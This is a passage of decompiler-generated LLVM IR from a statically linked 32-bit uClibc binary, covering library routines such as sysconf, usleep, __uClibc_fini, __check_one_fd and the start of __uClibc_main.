  %v4_805183b = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805183b, i32 0)
  store i32 %v4_805183b, i32* %eax.global-to-local, align 4
  %v0_8051840 = load i32, i32* @esi, align 4
  %v1_8051840 = load i32, i32* @ebx, align 4
  %v2_8051840 = inttoptr i32 %v1_8051840 to i32*
  store i32 %v0_8051840, i32* %v2_8051840, align 4
  %v0_805186a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051867

dec_label_pc_8051844:                             ; preds = %dec_label_pc_805180a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805184a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805184a = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805184a, i32 0)
  store i32 %v4_805184a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051860

dec_label_pc_8051855:                             ; preds = %dec_label_pc_8051787
  %v2_8051857 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051857, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051860

dec_label_pc_8051860:                             ; preds = %dec_label_pc_8051844, %dec_label_pc_8051855
  %storemerge3.pre-phi = phi i32 [ %v2_8051816, %dec_label_pc_8051844 ], [ %v2_8051857, %dec_label_pc_8051855 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8051860 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8051860 = call i32 @__libc_nanosleep(%timespec* %v2_8051860, i32 %storemerge3.pre-phi)
  store i32 %v3_8051860, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051867

dec_label_pc_8051867:                             ; preds = %dec_label_pc_805181f, %dec_label_pc_8051860
  %v0_805186a = phi i32 [ %v0_805186a.pre, %dec_label_pc_805181f ], [ %v3_8051860, %dec_label_pc_8051860 ]
  %v1_805186a = icmp eq i32 %v0_805186a, 0
  br i1 %v1_805186a, label %dec_label_pc_8051887, label %dec_label_pc_805186e

dec_label_pc_805186e:                             ; preds = %dec_label_pc_8051867
  %v4_805187e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805187e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805188e

dec_label_pc_8051887:                             ; preds = %entry, %dec_label_pc_8051867
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805188e

dec_label_pc_805188b:                             ; preds = %dec_label_pc_80517b0, %dec_label_pc_805176b, %dec_label_pc_805173d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805188e

dec_label_pc_805188e:                             ; preds = %dec_label_pc_8051887, %dec_label_pc_805186e, %dec_label_pc_80517e2, %dec_label_pc_805188b
  %v0_8051898 = phi i32 [ 0, %dec_label_pc_8051887 ], [ %v4_805187e, %dec_label_pc_805186e ], [ %v0_8051898.pre, %dec_label_pc_80517e2 ], [ -1, %dec_label_pc_805188b ]
  store i32 %v0_8051718, i32* @ebx, align 4
  store i32 %v0_8051717, i32* @esi, align 4
  store i32 %v0_8051716, i32* @edi, align 4
  ret i32 %v0_8051898

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805182a, { 1, 0, 2 }
  uselistorder i32 %v2_8051816, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80517ad, { 2, 1, 0 }
  uselistorder i32 %v2_805176c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8051753, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805173a, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805188e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051887, { 1, 0 }
  uselistorder label %dec_label_pc_8051867, { 1, 0 }
  uselistorder label %dec_label_pc_8051860, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80518bb [
    i32 0, label %dec_label_pc_80518cb
    i32 1, label %dec_label_pc_80519b0
    i32 2, label %dec_label_pc_80518d5
    i32 3, label %dec_label_pc_80518df
    i32 4, label %dec_label_pc_80518e9
    i32 5, label %dec_label_pc_805197f
    i32 6, label %dec_label_pc_80518f1
    i32 7, label %dec_label_pc_80518b1
    i32 8, label %dec_label_pc_80518b1
    i32 9, label %dec_label_pc_80518b1
    i32 10, label %dec_label_pc_80518b1
    i32 11, label %dec_label_pc_80518b1
    i32 12, label %dec_label_pc_80518b1
    i32 13, label %dec_label_pc_80518b1
    i32 14, label %dec_label_pc_80518b1
    i32 15, label %dec_label_pc_80518b1
    i32 16, label %dec_label_pc_80518b1
    i32 17, label %dec_label_pc_80518b1
    i32 18, label %dec_label_pc_80518b1
    i32 19, label %dec_label_pc_80518b1
    i32 20, label %dec_label_pc_80518b1
    i32 21, label %dec_label_pc_80518b1
    i32 22, label %dec_label_pc_80518b1
    i32 23, label %dec_label_pc_80519b0
    i32 24, label %dec_label_pc_80519b0
    i32 25, label %dec_label_pc_80519bc
    i32 26, label %dec_label_pc_805198d
    i32 27, label %dec_label_pc_80519b0
    i32 28, label %dec_label_pc_8051903
    i32 29, label %dec_label_pc_8051986
    i32 30, label %dec_label_pc_80518fb
    i32 31, label %dec_label_pc_805199b
    i32 32, label %dec_label_pc_80519b0
    i32 33, label %dec_label_pc_80519b0
    i32 34, label %dec_label_pc_80519b0
    i32 35, label %dec_label_pc_8051994
    i32 36, label %dec_label_pc_80519c3
    i32 37, label %dec_label_pc_80519ca
    i32 38, label %dec_label_pc_80519c3
    i32 39, label %dec_label_pc_805190d
    i32 40, label %dec_label_pc_80519d1
    i32 41, label %dec_label_pc_80519b0
    i32 42, label %dec_label_pc_805199b
    i32 43, label %dec_label_pc_80519ca
    i32 44, label %dec_label_pc_80519d8
    i32 45, label %dec_label_pc_80519ca
    i32 46, label %dec_label_pc_8051986
    i32 47, label %dec_label_pc_8051986
    i32 48, label %dec_label_pc_8051986
    i32 49, label %dec_label_pc_80519b0
    i32 50, label %dec_label_pc_80519b0
    i32 51, label %dec_label_pc_8051986
    i32 52, label %dec_label_pc_8051986
    i32 53, label %dec_label_pc_80519b0
    i32 54, label %dec_label_pc_80519b0
    i32 55, label %dec_label_pc_80519b0
    i32 56, label %dec_label_pc_80519b0
    i32 57, label %dec_label_pc_80519b0
    i32 58, label %dec_label_pc_80519b0
    i32 59, label %dec_label_pc_80519b0
    i32 60, label %dec_label_pc_80519b0
    i32 61, label %dec_label_pc_80519b0
    i32 62, label %dec_label_pc_80519b0
    i32 63, label %dec_label_pc_80519b0
    i32 64, label %dec_label_pc_80519b0
    i32 65, label %dec_label_pc_80519b0
    i32 66, label %dec_label_pc_80519b0
    i32 67, label %dec_label_pc_80518b1
    i32 68, label %dec_label_pc_80518b1
    i32 69, label %dec_label_pc_8051994
    i32 70, label %dec_label_pc_8051994
    i32 71, label %dec_label_pc_8051994
    i32 72, label %dec_label_pc_805199b
    i32 73, label %dec_label_pc_80519a2
    i32 74, label %dec_label_pc_80519a9
    i32 75, label %dec_label_pc_8051917
    i32 76, label %dec_label_pc_80519a9
    i32 77, label %dec_label_pc_80518b1
    i32 78, label %dec_label_pc_80518b1
    i32 79, label %dec_label_pc_80518b1
    i32 80, label %dec_label_pc_80518b1
    i32 81, label %dec_label_pc_80518b1
    i32 82, label %dec_label_pc_80518b1
    i32 83, label %dec_label_pc_80518b1
    i32 84, label %dec_label_pc_80518b1
    i32 85, label %dec_label_pc_80519b0
    i32 86, label %dec_label_pc_80519b0
    i32 87, label %dec_label_pc_805198d
    i32 88, label %dec_label_pc_8051921
    i32 89, label %dec_label_pc_805192b
    i32 90, label %dec_label_pc_80519a2
    i32 91, label %dec_label_pc_80518b1
    i32 92, label %dec_label_pc_80518b1
    i32 93, label %dec_label_pc_80518b1
    i32 94, label %dec_label_pc_80518b1
    i32 95, label %dec_label_pc_8051986
    i32 96, label %dec_label_pc_80519b0
    i32 97, label %dec_label_pc_80519b0
    i32 98, label %dec_label_pc_80518b1
    i32 99, label %dec_label_pc_80518b1
    i32 100, label %dec_label_pc_80518b1
    i32 101, label %dec_label_pc_8051935
    i32 102, label %dec_label_pc_8051978
    i32 103, label %dec_label_pc_80519b5
    i32 104, label %dec_label_pc_805198d
    i32 105, label %dec_label_pc_805193f
    i32 106, label %dec_label_pc_805199b
    i32 107, label %dec_label_pc_805199b
    i32 108, label %dec_label_pc_805197f
    i32 109, label %dec_label_pc_80519bc
    i32 110, label %dec_label_pc_80519d8
    i32 111, label %dec_label_pc_8051978
    i32 112, label %dec_label_pc_80519b5
    i32 113, label %dec_label_pc_80519d8
    i32 114, label %dec_label_pc_8051949
    i32 115, label %dec_label_pc_80519d1
    i32 116, label %dec_label_pc_80519b0
    i32 117, label %dec_label_pc_80519b0
    i32 118, label %dec_label_pc_8051953
    i32 119, label %dec_label_pc_805195d
    i32 120, label %dec_label_pc_80519ca
    i32 121, label %dec_label_pc_805198d
    i32 122, label %dec_label_pc_805198d
    i32 123, label %dec_label_pc_805198d
    i32 124, label %dec_label_pc_805198d
    i32 125, label %dec_label_pc_80518b1
    i32 126, label %dec_label_pc_80518b1
    i32 127, label %dec_label_pc_80519b0
    i32 128, label %dec_label_pc_80519b0
    i32 129, label %dec_label_pc_80518b1
    i32 130, label %dec_label_pc_80518b1
    i32 131, label %dec_label_pc_80519b0
    i32 149, label %dec_label_pc_8051964
  ]

dec_label_pc_80518b1:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80518bb:                             ; preds = %entry
  %v1_80518bb = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80518c0 = inttoptr i32 %v1_80518bb to i32*
  store i32 22, i32* %v1_80518c0, align 4
  br label %dec_label_pc_80519b0

dec_label_pc_80518cb:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80518d5:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80518df:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80518e9:                             ; preds = %entry
  %v0_80518ec = call i32 @getdtablesize()
  br label %dec_label_pc_80518f1

dec_label_pc_80518f1:                             ; preds = %entry, %dec_label_pc_80518e9
  br label %dec_label_pc_80519dd

dec_label_pc_80518fb:                             ; preds = %entry
  %v3_80518fe = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051903

dec_label_pc_8051903:                             ; preds = %entry, %dec_label_pc_80518fb
  br label %dec_label_pc_80519dd

dec_label_pc_805190d:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051917:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051921:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_805192b:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051935:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_805193f:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051949:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051953:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_805195d:                             ; preds = %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051964:                             ; preds = %entry
  %v5_805196a = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8051972 = icmp slt i32 %v5_805196a, 0
  %v1_8051974 = icmp eq i1 %v2_8051972, false
  br i1 %v1_8051974, label %dec_label_pc_8051986, label %dec_label_pc_80519b0

dec_label_pc_8051978:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_805197f:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051986:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051964
  br label %dec_label_pc_80519dd

dec_label_pc_805198d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_8051994:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_805199b:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519a2:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519a9:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519b0:                             ; preds = %dec_label_pc_8051964, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80518bb
  br label %dec_label_pc_80519dd

dec_label_pc_80519b5:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519bc:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519c3:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519ca:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519d1:                             ; preds = %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519d8:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_80519dd

dec_label_pc_80519dd:                             ; preds = %dec_label_pc_80519d1, %dec_label_pc_80519ca, %dec_label_pc_80519c3, %dec_label_pc_80519bc, %dec_label_pc_80519b5, %dec_label_pc_80519a9, %dec_label_pc_80519a2, %dec_label_pc_805199b, %dec_label_pc_8051994, %dec_label_pc_805198d, %dec_label_pc_805197f, %dec_label_pc_8051978, %dec_label_pc_8051986, %dec_label_pc_805195d, %dec_label_pc_8051953, %dec_label_pc_8051949, %dec_label_pc_805193f, %dec_label_pc_8051935, %dec_label_pc_805192b, %dec_label_pc_8051921, %dec_label_pc_8051917, %dec_label_pc_805190d, %dec_label_pc_8051903, %dec_label_pc_80518f1, %dec_label_pc_80518df, %dec_label_pc_80518d5, %dec_label_pc_80518cb, %dec_label_pc_80518b1, %dec_label_pc_80519b0, %dec_label_pc_80519d8
  %v0_80519e0 = phi i32 [ 255, %dec_label_pc_80519d1 ], [ 2048, %dec_label_pc_80519ca ], [ 99, %dec_label_pc_80519c3 ], [ 20, %dec_label_pc_80519bc ], [ -128, %dec_label_pc_80519b5 ], [ 1024, %dec_label_pc_80519a9 ], [ 4, %dec_label_pc_80519a2 ], [ 32, %dec_label_pc_805199b ], [ 256, %dec_label_pc_8051994 ], [ 2147483647, %dec_label_pc_805198d ], [ 16, %dec_label_pc_805197f ], [ 127, %dec_label_pc_8051978 ], [ 200112, %dec_label_pc_8051986 ], [ 9, %dec_label_pc_805195d ], [ 65535, %dec_label_pc_8051953 ], [ -32768, %dec_label_pc_8051949 ], [ -2147483648, %dec_label_pc_805193f ], [ 8, %dec_label_pc_8051935 ], [ 500, %dec_label_pc_805192b ], [ 4096, %dec_label_pc_8051921 ], [ 16384, %dec_label_pc_8051917 ], [ 1000, %dec_label_pc_805190d ], [ 32768, %dec_label_pc_8051903 ], [ 6, %dec_label_pc_80518f1 ], [ 65536, %dec_label_pc_80518df ], [ 100, %dec_label_pc_80518d5 ], [ 131072, %dec_label_pc_80518cb ], [ 1, %dec_label_pc_80518b1 ], [ -1, %dec_label_pc_80519b0 ], [ 32767, %dec_label_pc_80519d8 ]
  ret i32 %v0_80519e0

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 2, 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 49, { 3, 2, 0, 1 }
  uselistorder i32 39, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 7, 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 19, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80519dd, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80519b0, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051986, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051903, { 1, 0 }
  uselistorder label %dec_label_pc_80518f1, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_80519ec = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_80519ec, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_8051a0b = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8051a0b = call i32 @__libc_nanosleep(%timespec* %v2_8051a0b, i32 0)
  ret i32 %v3_8051a0b

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a14 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a14, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 0), label %dec_label_pc_8051a28, label %dec_label_pc_8051a35

dec_label_pc_8051a28:                             ; preds = %entry, %dec_label_pc_8051a28
  %v1_8051a2f6 = phi i32 [ %v1_8051a2f, %dec_label_pc_8051a28 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.211 to i32), i32 -134578176), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8051a2f.212 to i32), i32* %stack_var_-16, align 4
  %v5_8051a28 = mul i32 %v1_8051a2f6, 4
  %v6_8051a28 = add i32 %v5_8051a28, ptrtoint (i32* @global_var_8058000.211 to i32)
  %v7_8051a28 = inttoptr i32 %v6_8051a28 to i32*
  %v8_8051a28 = load i32, i32* %v7_8051a28, align 4
  call void @__pseudo_call(i32 %v8_8051a28)
  %v0_8051a2f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a2f = add i32 %v0_8051a2f.pre, -1
  store i32 %v1_8051a2f, i32* %ebx.global-to-local, align 4
  %v10_8051a30 = icmp eq i32 %v0_8051a2f.pre, 0
  %v1_8051a33 = icmp eq i1 %v10_8051a30, false
  br i1 %v1_8051a33, label %dec_label_pc_8051a28, label %dec_label_pc_8051a35

dec_label_pc_8051a35:                             ; preds = %dec_label_pc_8051a28, %entry
  %v0_8051a35 = load i32, i32* @global_var_805e714.213, align 4
  %v1_8051a3a = icmp eq i32 %v0_8051a35, 0
  br i1 %v1_8051a3a, label %dec_label_pc_8051a40, label %dec_label_pc_8051a3e

dec_label_pc_8051a3e:                             ; preds = %dec_label_pc_8051a35
  %v0_8051a3e = load i32, i32* %stack_var_-16, align 4
  %v1_8051a3e = call i32 @unknown_0(i32 %v0_8051a3e)
  br label %dec_label_pc_8051a40

dec_label_pc_8051a40:                             ; preds = %dec_label_pc_8051a3e, %dec_label_pc_8051a35
  %v0_8051a40 = load i32, i32* @global_var_805e718.214, align 8
  %v1_8051a46 = icmp eq i32 %v0_8051a40, 0
  br i1 %v1_8051a46, label %dec_label_pc_8051a4f, label %dec_label_pc_8051a4a

dec_label_pc_8051a4a:                             ; preds = %dec_label_pc_8051a40
  %v2_8051a4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a4c, i32* %ebx.global-to-local, align 4
  %v0_8051a4d = load i32, i32* %stack_var_-16, align 4
  %v1_8051a4d = call i32 @unknown_0(i32 %v0_8051a4d)
  br label %dec_label_pc_8051a4f

dec_label_pc_8051a4f:                             ; preds = %dec_label_pc_8051a40, %dec_label_pc_8051a4a
  %v2_8051a4f = load i32, i32* %stack_var_-16, align 4
  %v2_8051a50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051a50, i32* @edx, align 4
  ret i32 %v2_8051a4f

; uselistorder directives
  uselistorder i32 %v1_8051a2f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051a4f, { 1, 0 }
  uselistorder label %dec_label_pc_8051a28, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051a56 = load i32, i32* @eax, align 4
  ret i32 %v0_8051a56
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a57 = load i32, i32* @esi, align 4
  %v0_8051a58 = load i32, i32* @eax, align 4
  store i32 %v0_8051a58, i32* @esi, align 4
  %v0_8051a5a = load i32, i32* @ebx, align 4
  store i32 %v0_8051a5a, i32* %stack_var_-8, align 4
  %v0_8051a5b = load i32, i32* @edx, align 4
  store i32 %v0_8051a5b, i32* @ebx, align 4
  %v4_8051a63 = call i32 @__libc_fcntl(i32 %v0_8051a58, i32 1, i32 %tmp6)
  %v8_8051a6b = icmp eq i32 %v4_8051a63, -1
  %v1_8051a6c = icmp eq i1 %v8_8051a6b, false
  br i1 %v1_8051a6c, label %dec_label_pc_8051a87, label %dec_label_pc_8051a6e

dec_label_pc_8051a6e:                             ; preds = %entry
  %v0_8051a70 = load i32, i32* @ebx, align 4
  %v5_8051a76 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057620.215, i32 0, i32 0), i32 %v0_8051a70)
  %v1_8051a7e = load i32, i32* @esi, align 4
  %v12_8051a7e = icmp eq i32 %v5_8051a76, %v1_8051a7e
  br i1 %v12_8051a7e, label %dec_label_pc_8051a87, label %dec_label_pc_8051a82

dec_label_pc_8051a82:                             ; preds = %dec_label_pc_8051a6e
  %v0_8051a82 = call i32 @abort()
  br label %dec_label_pc_8051a87

dec_label_pc_8051a87:                             ; preds = %dec_label_pc_8051a6e, %entry, %dec_label_pc_8051a82
  %v2_8051a87 = load i32, i32* %stack_var_-12, align 4
  %v2_8051a88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a88, i32* @ebx, align 4
  store i32 %v0_8051a57, i32* @esi, align 4
  ret i32 %v2_8051a87

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051a87, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8051a8e = load i8, i8* @global_var_805e71c.216, align 4
  %v1_8051a8e = icmp eq i8 %v0_8051a8e, 0
  %v1_8051a95 = icmp eq i1 %v1_8051a8e, false
  br i1 %v1_8051a95, label %entry.dec_label_pc_8051ac7_crit_edge, label %dec_label_pc_8051a97

entry.dec_label_pc_8051ac7_crit_edge:             ; preds = %entry
  %v0_8051aca.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051ac7

dec_label_pc_8051a97:                             ; preds = %entry
  store i8 1, i8* @global_var_805e71c.216, align 4
  store i32 4096, i32* @global_var_805e710.141, align 16
  %v0_8051ac2 = call i32 @_stdio_init()
  br label %dec_label_pc_8051ac7

dec_label_pc_8051ac7:                             ; preds = %entry.dec_label_pc_8051ac7_crit_edge, %dec_label_pc_8051a97
  %v0_8051aca = phi i32 [ %v0_8051aca.pre, %entry.dec_label_pc_8051ac7_crit_edge ], [ %v0_8051ac2, %dec_label_pc_8051a97 ]
  ret i32 %v0_8051aca

; uselistorder directives
  uselistorder i8* @global_var_805e71c.216, { 1, 0 }
  uselistorder label %dec_label_pc_8051ac7, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805e708.217, align 8
  store i32 %arg6, i32* @global_var_805e718.214, align 8
  %v2_8051b02 = mul i32 %arg2, 4
  %v3_8051b02 = add i32 %tmp29, %v2_8051b02
  %v1_8051b05 = add i32 %v3_8051b02, 4
  store i32 %v1_8051b05, i32* %edx.global-to-local, align 4
  store i32 %v1_8051b05, i32* @global_var_805e70c.209, align 4
  %v3_8051b0e = load i32, i32* %arg3, align 4
  %v14_8051b0e = icmp eq i32 %v1_8051b05, %v3_8051b0e
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8051b14 = icmp eq i1 %v14_8051b0e, false
  %v4_8051b14 = select i1 %v1_8051b14, i32 %v1_8051b05, i32 %v3_8051b02
  store i32 %v4_8051b14, i32* @global_var_805e70c.209, align 4
  %v2_8051b1c = ptrtoint i32* %stack_var_-136 to i32
  %v3_8051b21 = bitcast i32* %stack_var_-136 to i8*
  %v4_8051b21 = call i32 @__GI_memset(i8* %v3_8051b21, i32 0, i32 120)
  %v0_8051b26 = load i32, i32* @global_var_805e70c.209, align 4
  br label %dec_label_pc_8051b2e

dec_label_pc_8051b2e:                             ; preds = %dec_label_pc_8051b2e, %entry
  %v0_8051b2e = phi i32 [ %v1_8051b31, %dec_label_pc_8051b2e ], [ %v0_8051b26, %entry ]
  %v1_8051b2e = inttoptr i32 %v0_8051b2e to i32*
  %v2_8051b2e = load i32, i32* %v1_8051b2e, align 4
  %v3_8051b2e = icmp eq i32 %v2_8051b2e, 0
  %v1_8051b31 = add i32 %v0_8051b2e, 4
  %v1_8051b34 = icmp eq i1 %v3_8051b2e, false
  br i1 %v1_8051b34, label %dec_label_pc_8051b2e, label %dec_label_pc_8051b55.preheader

dec_label_pc_8051b55.preheader:                   ; preds = %dec_label_pc_8051b2e
  store i32 %v1_8051b31, i32* @ebx, align 4
  %v1_8051b551 = inttoptr i32 %v1_8051b31 to i32*
  %v2_8051b552 = load i32, i32* %v1_8051b551, align 4
  %v3_8051b553 = icmp eq i32 %v2_8051b552, 0
  %v1_8051b5810 = icmp eq i1 %v3_8051b553, false
  br i1 %v1_8051b5810, label %dec_label_pc_8051b3a.lr.ph, label %dec_label_pc_8051b5a

dec_label_pc_8051b3a.lr.ph:                       ; preds = %dec_label_pc_8051b55.preheader
  %v3_8051b12 = ptrtoint i32* %stack_var_-168 to i32
